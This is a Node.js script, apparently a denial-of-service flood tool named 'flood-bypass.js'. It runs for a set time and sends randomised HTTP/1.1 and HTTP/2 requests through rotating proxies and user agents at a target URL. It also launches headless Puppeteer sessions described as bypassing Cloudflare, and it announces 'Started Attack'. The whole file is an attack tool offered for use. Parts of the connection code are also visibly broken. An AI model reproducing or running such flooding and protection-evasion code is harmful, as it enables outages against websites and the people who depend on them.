//Method By STEVEN•STORE🕊🪽
const puppeteer = require('puppeteer');
const axios = require('axios');
const http2 = require('http2');
const https = require('https');
const fs = require('fs');
const crypto = require('crypto');

const proxyList = fs.readFileSync('proxy.txt', 'utf-8').split('\n');
const userAgentList = fs.readFileSync('ua.txt', 'utf-8').split('\n');

const sendHttpRequest = async (url, proxy, userAgent) => {
  try {
    await axios.get(url, {
      headers: { 'User-Agent': userAgent },
      proxy: { host: proxy.split(':')[0], port: proxy.split(':')[1] },
      timeout: 5000,
    });
  } catch (err) {}
};

const sendHttp2Request = (url, proxy, userAgent) => {
  const client = http2.connect(url.startsWith('https') ? 'https://' + url : 'http://' + url, {
    createConnection: () => new https.Agent({ proxy: { host: proxy.split(':')[0], port: proxy.split(':')[1] } }),
  });

  const req = client.request({
    ':method': 'GET',
    ':path': '/',
    'User-Agent': userAgent,
  });

  req.on('response', () => req.close());
  req.on('error', () => {});
  req.end();
};

const bypassCloudflare = async (url, proxy, userAgent) => {
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();

  await page.setUserAgent(userAgent);
  await page.setRequestInterception(true);
  page.on('request', req => req.continue({ headers: { ...req.headers(), 'User-Agent': userAgent } }));

  await page.setViewport({ width: 1280, height: 800 });
  await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-US,en;q=0.9' });

  try {
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 0 });
    await page.waitForTimeout(5000);
    await page.cookies();
  } catch (err) {}

  await browser.close();
};

const sendRequest = async (url, timeLimit) => {
  const endTime = Date.now() + timeLimit * 1000;

  while (Date.now() < endTime) {
    const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
    const userAgent = userAgentList[Math.floor(Math.random() * userAgentList.length)];

    if (Math.random() > 0.5) {
      sendHttp2Request(url, proxy, userAgent);
    } else {
      sendHttpRequest(url, proxy, userAgent);
    }

    // buat bypass clodpeler
    bypassCloudflare(url, proxy, userAgent);
  }
};

const [url, time] = process.argv.slice(2);
const timeLimit = parseInt(time);

if (!url || !timeLimit) {
  console.log('Usage: node flood-bypass.js <url> <time>');
  process.exit(1);
}

console.log('Started Attack');
sendRequest(url, timeLimit);
